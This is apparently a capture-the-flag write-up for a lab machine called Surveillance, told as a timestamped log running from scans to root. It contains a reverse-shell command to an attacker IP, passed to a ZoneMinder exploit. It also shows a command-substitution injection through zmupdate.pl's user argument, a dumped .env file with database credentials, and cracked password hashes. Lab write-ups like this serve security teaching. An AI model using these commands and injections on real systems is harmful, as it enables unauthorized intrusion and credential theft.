# Surveillance

## 12:08

On first glance looks like a basis company page for surveillance, door control
systems, and fire alarms.

## 12:37

### Automated scans
#### FFUF

```
$ ffuf -u "http://$TARGET/FUZZ" -w /opt/useful/seclists/Discovery/Web-Content/common.txt -t 10 -p 0.1

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://surveillance.htb/FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 10
 :: Delay            : 0.10 seconds
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.gitkeep                [Status: 200, Size: 0, Words: 1, Lines: 1]
.htaccess               [Status: 200, Size: 304, Words: 43, Lines: 10]
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1]
css                     [Status: 301, Size: 178, Words: 6, Lines: 8]
fonts                   [Status: 301, Size: 178, Words: 6, Lines: 8]
images                  [Status: 301, Size: 178, Words: 6, Lines: 8]
img                     [Status: 301, Size: 178, Words: 6, Lines: 8]
index.php               [Status: 200, Size: 16228, Words: 5713, Lines: 476]
index                   [Status: 200, Size: 1, Words: 1, Lines: 2]
js                      [Status: 301, Size: 178, Words: 6, Lines: 8]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1]
web.config              [Status: 200, Size: 1202, Words: 385, Lines: 28]
:: Progress: [4723/4723] :: Job [1/1] :: 29 req/sec :: Duration: [0:02:41] :: Errors: 0 ::
```
#### NMAP
```
$ sudo nmap -sS 10.10.11.245 -sV                                                             12:34:48
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-23 12:37 CET
Nmap scan report for surveillance.htb (10.10.11.245)
Host is up (0.042s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.50 seconds
```

## 12:41

From the scans we can see a `admin` login page. This is `craftcms` and in the
source of the root page we can find version `4.4.14` for this. It seems there is
a RCE exploit for this version.

```
https://nvd.nist.gov/vuln/detail/CVE-2023-41892
```

## 14:48

Using the exploit POC found on:
https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce we could get a
shell going. This script had to be modified (data had to be written to the
`cpresources` folder and proxying the request somehow didn't trigger the exploit
:/ )

## 14:50

Looking in the files of the web user we find an `.env` containing some database
stuff:

```
www-data@surveillance:~/html/craft$ cat .env
# Read about configuration, here:
# https://craftcms.com/docs/4.x/config/

# The application ID used to to uniquely store session and cache data, mutex locks, and more
CRAFT_APP_ID=CraftCMS--070c5b0b-ee27-4e50-acdf-0436a93ca4c7

# The environment Craft is currently running in (dev, staging, production, etc.)
CRAFT_ENVIRONMENT=production

# The secure key Craft will use for hashing and encrypting data
CRAFT_SECURITY_KEY=2HfILL3OAEe5X0jzYOVY5i7uUizKmB2_

# Database connection settings
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=craftdb
CRAFT_DB_USER=craftuser
CRAFT_DB_PASSWORD=CraftCMSPassword2023!
CRAFT_DB_SCHEMA=
CRAFT_DB_TABLE_PREFIX=

# General settings (see config/general.php)
DEV_MODE=false
ALLOW_ADMIN_CHANGES=false
DISALLOW_ROBOTS=false

PRIMARY_SITE_URL=http://surveillance.htb/
```

## 14:57

Extracted the users table. This contains a single user with a hash. Let's
hashcat this:

| username | fullname  | email                  | password hash |
| -------- | --------- | ---------------------- | -------- |
| admin    | Matthew B | admin@surveillance.htb |`$2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe`|

## 15:33

Unable to crack the password but there was also a backup file containing another
has. Namely `39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec`

Cracking this gave us the password: `starcraft122490`

With this we can login with `ssh matthew@surveillance.htb`

## 15:41

In `/etc/passwd` we find a `zoneminder` user, this might be part of
`https://github.com/ZoneMinder/zoneminder`

## 15:48

Zoneminder is running locally on port `8080`. When we setup an ssh tunnel we can
access this interface:

```
$ ssh -L 8080:127.0.0.1:8080 matthew@surveillance.htb
```

Also zoneminder is running version 1.36.32 which is vulnerable to sql injection.

## 16:00

Using `https://github.com/heapbytes/CVE-2023-26035` we can get an ssh login as
the zoneminder user. This is using the local port forward:

```
$ python poc_zoneminder.py --target http://localhost:8080/ --cmd 'bash -c "bash -i >& /dev/tcp/10.10.14.38/9001 0>&1"'
```

## 16:01

The zoneminder user can run a sudo command without a password. 

```
$ whoami
zoneminder

$ sudo -l
Matching Defaults entries for zoneminder on surveillance:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User zoneminder may run the following commands on surveillance:
    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *

```

This matches the following commands:

```
$ ls /usr/bin/zm[a-zA-Z]*.pl
/usr/bin/zmaudit.pl
/usr/bin/zmcamtool.pl
/usr/bin/zmcontrol.pl
/usr/bin/zmdc.pl
/usr/bin/zmfilter.pl
/usr/bin/zmonvif-probe.pl
/usr/bin/zmonvif-trigger.pl
/usr/bin/zmpkg.pl
/usr/bin/zmrecover.pl
/usr/bin/zmstats.pl
/usr/bin/zmsystemctl.pl
/usr/bin/zmtelemetry.pl
/usr/bin/zmtrack.pl
/usr/bin/zmtrigger.pl
/usr/bin/zmupdate.pl
/usr/bin/zmvideo.pl
/usr/bin/zmwatch.pl
/usr/bin/zmx10.pl
```

## 16:27

`zmupdate.pl` Has to possibility to run arbritrary commands. The following part
of the code is exploitable:

```
if $Config{ZM_DB_HOST};
  my $command = 'mysql';
  if ($super) {
    $command .= ' --defaults-file=/etc/mysql/debian.cnf';
  } elsif ($dbUser) {
    $command .= ' -u'.$dbUser;
    $command .= ' -p\''.$dbPass.'\'' if $dbPass;
  }
```

In short we set the `user` argument to `--user '$(/tmp/script.sh)'` . Then the
constructed command by this code will look something like:
```
mysql -u $(/tmp/script.sh) -p '...'
```

When this command runs it triggers our own script, if we set up this script in
such a way that it opens a reverse shell we can get a root login.
